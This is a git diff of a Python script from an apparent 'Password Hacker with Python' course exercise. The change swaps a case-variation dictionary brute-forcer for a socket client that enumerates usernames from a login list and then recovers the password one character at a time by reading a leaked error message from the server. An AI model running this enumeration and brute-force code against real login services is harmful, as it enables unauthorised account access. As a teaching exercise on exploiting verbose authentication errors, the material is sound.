@@ -1,4 +1,4 @@
-import itertools
+import json
 import socket
 import sys
 
@@ -14,29 +14,38 @@ address = (host, int(port))
 
 with socket.socket() as sock:
     sock.connect(address)
-    password_list = file_line_iterator(
-        filename="/Users/akshitmehta/PycharmProjects/Password Hacker with Python/Password Hacker with Python/task/Stepik passwords.txt")
+    login_list = file_line_iterator(
+        filename="/Users/akshitmehta/PycharmProjects/Password Hacker with Python/Password Hacker with Python/task/Step.txt")
     found = False
     request_exceeded = False
 
     try:
-        while True:
-            password = next(password_list)
-            letter_cases = [(letter.lower(), letter.upper()) for letter in password]
-            for combination in map(lambda x: ''.join(x), itertools.product(*letter_cases)):
-                sock.send(combination.encode())
-                response = sock.recv(1024).decode().strip()
-
-                if response == "Connection success!":
-                    found = True
-                    print(combination)
-                    break
-                elif response == "Too many attempts.":
-                    request_exceeded = True
-                    break
-
-            if found or request_exceeded:
+        username = None
+        for login in login_list:
+            credentials = json.dumps({"login": login, "password": "asoiaf"})
+            sock.send(credentials.encode())
+            response = json.loads(sock.recv(1024).decode())
+            if response["result"] == "Wrong password!":
+                username = login
                 break
+        password = ''
+        while True:
+            found = False
+            for ascii_code in range(128):
+                passw = password + chr(ascii_code)
+                credentials = json.dumps({"login": username, "password": passw})
+                sock.send(credentials.encode())
+                response = json.loads(sock.recv(1024).decode())
+                if response["result"] == "Exception happened during login":
+                    password += chr(ascii_code)
+                    break
+                elif response["result"] == "Connection success!":
+                    found = True
+                    break
+            if found:
+                break
+        credentials = {"login": username, "password": password}
+        print(json.dumps(credentials))
 
     except StopIteration:
         pass
